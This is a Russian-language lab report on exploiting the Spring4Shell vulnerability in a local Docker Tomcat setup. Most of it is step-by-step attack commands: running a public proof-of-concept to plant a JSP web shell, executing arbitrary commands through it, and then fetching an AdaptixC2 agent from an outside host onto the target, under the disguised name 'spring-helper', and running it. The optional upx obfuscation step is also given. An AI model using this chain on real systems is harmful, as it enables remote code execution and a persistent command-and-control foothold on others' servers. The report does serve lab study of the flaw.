# Отчет об развертывании и эксплуатации уязвимости spring4shell

## Описание уязвимости
Уязвимость доступна при следующей комбинации:
* JDK 9 или старше
* Apache tomcat
* Spring до 5.2.19
* spring-webmvc
* Формат WAR(Web Application Resource) вместо стандартного JAR
Где:
* Spring - популярный веб фреймворк на java
* apache tomcat - веб сервер для приложений на java
* war-файл - собранное приложение на java
* spring-webmvc - зависимость java spring. Фреймворк для разработки restful веб
  приложений.



## Развертывание
Загрузка Proof of Concept репозитория и сборка уязвимого окружения с помощью
docker.

```sh
git clone https://github.com/TheK4n/Spring4Shell-POC
cd Spring4Shell-POC
docker build -t vulnerable-tomcat vulnerable-tomcat/
docker run --rm -d --name vulnerable-tomcat -p 8080:8080 vulnerable-tomcat
```


## Эксплуатация
Запуск скрипта
```sh
python3 -m venv venv
. ./venv/bin/activate
pip install -r requirements.txt
python3 ./poc.py --url http://localhost:8080/spring-form/greeting
```
Должно появиться сообщение вида:

    Vulnerable，shell url: http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami


Для проверки ввести команду:
```sh
curl --output - 'http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami'
```
Появится сообщение вида:

    root

    //
    ...


`root` указывает на имя пользователя, под которым запущен уязвимый фреймворк.
Далее можно ввести в http параметр cmd любую команду, которая будет исполнена в
уязвимой среде:
```sh
# команда просмотра корневой директории хост машины уязвимого фреймворка
curl --output - 'http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=ls+/'
```

    bin
    boot
    dev
    etc
    home
    lib
    lib64
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var

    //
    ...


### Постэксплуатация с использованием AdaptixC2
1. Генерация агента Gopher под linux
2. Опциональная обфускация агента (например сжатие с помощью upx)
3. Создание веб сервера на хосте adaptix для пересылки агента на целевую
   машину, например след командой:
```sh
# в директории с агентом
python3 -m http.server 8000
```
4. Эксплуатируя уязвимость скачать агента на целевую машину, например с помощью
   curl:
```sh
curl --output - 'http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=curl+192.168.50.10:8000/agent.bin+-o+/usr/bin/spring-helper'
```
5. Добавить бит исполняемости для агента:
```sh
curl --output - 'http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=chmod+755+/usr/bin/spring-helper'
```
6. Запустить агент
```sh
curl --output - 'http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=/usr/bin/spring-helper'
```
